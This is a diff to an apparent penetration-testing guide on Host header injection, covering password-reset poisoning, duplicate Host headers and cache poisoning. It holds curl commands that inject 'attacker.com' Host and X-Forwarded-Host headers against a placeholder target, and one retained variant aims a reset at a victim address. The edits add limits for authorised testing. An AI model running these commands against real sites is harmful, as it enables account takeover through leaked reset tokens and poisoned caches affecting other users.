@@ -35,7 +35,7 @@ Exploit web server reliance on the Host header to poison password reset links, w
 # Trigger password reset with injected Host
 curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/forgot-password \
   -H "Host: attacker.com" \
-  -d "email=victim@example.com"
+  -d "email=YOUR_TEST_EMAIL"
 
 # X-Forwarded-Host variant
 curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/forgot-password \
@@ -43,7 +43,7 @@ curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/forgot-password \
   -d "email=victim@example.com"
 ```
 
-If the reset email link contains `attacker.com`, the token is leaked when victim clicks.
+Use only `YOUR_TEST_EMAIL` and a hostname you control. If the reset email sent to your own inbox contains that controlled hostname, preserve the message and URL with the token redacted. Do not redeem tokens in a way that changes another account or forward tokens to an external collector.
 
 ### Phase 2: Duplicate Host Headers
 
@@ -80,8 +80,8 @@ curl --max-time 15 --connect-timeout 5 "https://TARGET/api" \
 
 ```bash
 # If response is cached with injected host
-curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Forwarded-Host: attacker.com" -H "X-Cache: miss"
-# Subsequent requests from any user will get poisoned response
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/?cb=UNIQUE_TEST_VALUE" -H "X-Forwarded-Host: canary.attacker.example"
+# Repeat the exact URL without the injected header; use a unique test key and confirm only your harmless canary persists
 ```
 
 ## What Constitutes a Finding
@@ -109,6 +109,7 @@ curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Forwarded-Host: att
 - For routing bypass, compare the same endpoint with the canonical host and the manipulated host. A different status code alone is not proof of unauthorized access; inspect the response and authorization behavior.
 - For cache impact, use `attack-cache-poison` as the companion skill and prove that a clean request receives the altered response without the injected header.
 - Do not treat duplicate Host-header parsing differences as exploitable unless the proxy/origin behavior and impact are reproducible within the program's rules.
+
 ## References
 
 - [PortSwigger: Host Header Attacks](https://portswigger.net/web-security/host-header)
